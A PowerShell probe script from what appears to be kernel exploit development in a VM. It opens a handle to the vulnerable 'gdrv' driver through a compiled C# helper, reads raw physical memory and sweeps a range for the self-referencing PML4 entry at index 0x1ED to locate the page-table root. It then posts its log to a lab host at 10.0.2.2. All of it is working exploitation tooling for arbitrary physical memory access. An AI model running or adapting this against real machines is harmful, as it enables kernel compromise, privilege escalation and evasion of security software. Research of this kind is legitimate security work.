# probeA.ps1 - VARIANT A (baseline): does the exact ScanPml4 predicate fire in this VM?
#   predicate: PML4[0x1ED] present AND == the page's own PA  -> that page is the PML4 (CR3)
$ErrorActionPreference = 'Continue'
$base = 'http://10.0.2.2:8080'
$d = $PSScriptRoot
$log = New-Object System.Collections.ArrayList
function L([string]$s) { $log.Add($s) | Out-Null; Write-Host $s }
try { Add-Type -Path (Join-Path $d 'p37_prov.cs') } catch { L ('COMPILE FAIL ' + $_.Exception.Message); $log -join "`r`n" | Set-Content "$d\probeA.out"; exit 1 }

$g = [IntPtr]::Zero
$e = [P37Prov]::GdrvOpen([ref]$g)
L ('open=' + $e)
if ($e -ne '') { $log -join "`r`n" | Set-Content "$d\probeA.out"; exit 1 }

# 1) read sanity
foreach ($pa in [uint64]0x1000, [uint64]0x4000000, [uint64]0x12000000, [uint64]0x20000000) {
    try {
        $b = [P37Prov]::GdrvReadOneRaw($g, $pa, 0x1000)
        $nz = 0; for ($i = 0; $i -lt 4096; $i++) { if ($b[$i] -ne 0) { $nz++ } }
        L ('sample pa=0x{0:x} nonzero={1} head={2}' -f $pa, $nz, [P37Prov]::Hex($b[0..7]))
    } catch { L ('sample pa=0x{0:x} ERR {1}' -f $pa, $_.Exception.Message) }
}

# 2) the predicate, exactly as ScanPml4 applies it
$self = 0; $present = 0; $hits = @(); $pages = 0
$t0 = Get-Date
for ($pa = [uint64]0x4000000; $pa -lt [uint64]0x40000000; $pa += 0x10000) {
    try { $b = [P37Prov]::GdrvReadOneRaw($g, $pa, 0x10000) } catch { continue }
    $pages++
    for ($o = 0; $o -lt 0x10000; $o += 0x1000) {
        $ev = [BitConverter]::ToUInt64($b, $o + 0x1ED * 8)
        $page = $pa + [uint64]$o
        if (($ev -band 1) -ne 0) { $present++ }
        if ($ev -ne 0 -and (($ev -band 0x000FFFFFFFFFF000L) -eq $page)) {
            $self++
            if ($hits.Count -lt 12) { $hits += ('page=0x{0:x} entry=0x{1:x}' -f $page, $ev) }
        }
    }
}
$secs = ((Get-Date) - $t0).TotalSeconds
L ('sweep 0x4000000-0x40000000 scanned_pages={0} present_1ED={1} self_referencing={2} in {3:N1}s' -f ($pages * 16), $present, $self, $secs)
foreach ($h in $hits) { L ('  HIT ' + $h) }
if ($self -gt 0) { L 'VERDICT: predicate FIRES in guest (0x1ED self-reference found)' } else { L 'VERDICT: predicate silent (no 0x1ED self-reference) in range' }

$body = $log -join "`r`n"
Set-Content -LiteralPath "$d\probeA.out" -Value $body
try { (New-Object Net.WebClient).UploadString("$base/log?vm=$((New-Object Net.WebClient).DownloadString("$base/active.txt")).Trim()", ("## probeA`r`n" + $body)) } catch { }
